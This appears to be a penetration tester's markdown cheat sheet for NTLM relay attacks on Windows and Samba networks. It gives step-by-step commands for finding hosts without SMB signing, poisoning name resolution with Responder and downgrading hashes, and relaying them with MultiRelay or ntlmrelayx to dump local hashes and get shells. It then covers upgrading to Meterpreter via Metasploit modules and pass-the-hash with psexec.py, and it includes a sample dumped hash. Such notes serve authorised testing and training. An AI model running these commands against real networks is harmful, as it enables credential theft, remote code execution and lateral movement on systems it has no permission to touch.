## Search for SMB signing
* `responder-RunFinger -i <target>`
    - identify host with SMB signing disbled 

## Responder 
* change `/etc/responder/Responder.conf` - relay the hash
  * `SMB` - off
  * `HTTP` - off
* `responder -I <interface> <--lm> <-dwPv>`
  - `--lm` downgrade NTLMv1/v2 hashes to LM hashes where possible
## Getting shell
### 1. MultiRelay
While responder is running:
* `responder-MultiRelay -t <target> -u <username/ALL> `

In case of issues with MultiRelay.py:
- `apt-get install gcc-mingw-w64-x86-64`
- `x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv`
- `x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode`

or
- `i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Runas.c -o /usr/share/responder/tools/MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv`
- `i686-w64-mingw32-gcc /usr/share/responder/tools/MultiRelay/bin/Syssvc.c -o /usr/share/responder/tools/MultiRelay/bin/Syssvc.exe -municode`

> [!Important]
To keep `SMB` and `HTTP` On in responder.conf - capture the hashes
- 1. Run responder until hashes is received and close
- 2. Run Multirelay
- 3. While MultiRelay is running, run again responder

### 2. ntlmrelayx
In responder.conf, `SMB` and `HTTP` are Off
* `impacket-ntlmrelayx -t <target>` - dumps the local hashes
* `impacket-ntlmrelayx -t 172.16.5.10 -i` - interactive shell

## Upgrade to Meterpreter shell
### Windows
* msf> `use exploit/windows/smb/psexec`
  - `set smbuser <localAccount>` - localAccount taken from `ntlmrelayx/MultiRelay.py` hash dump
  - `set smbpass <local-NTLM-hash>` - localAccount taken from `ntlmrelayx/MultiRelay.py` hash dump
e.g. localAccount and local-NTLM-hash is bolded in the following: __admin__:1005:__aad3b435b51404eeaad3b435b51404ee:179699ef43d4b9ba2f8f615f59893917__:::
### Linux
* msf> `use exploit/linux/samba/is_known_pipename`

## Psexec shell
* `psexec.py <domain>/<user>:'<password>'@<target-IP>`
* `psexec.py <user>@<target-IP>` - hashes <local-NTLM hash>
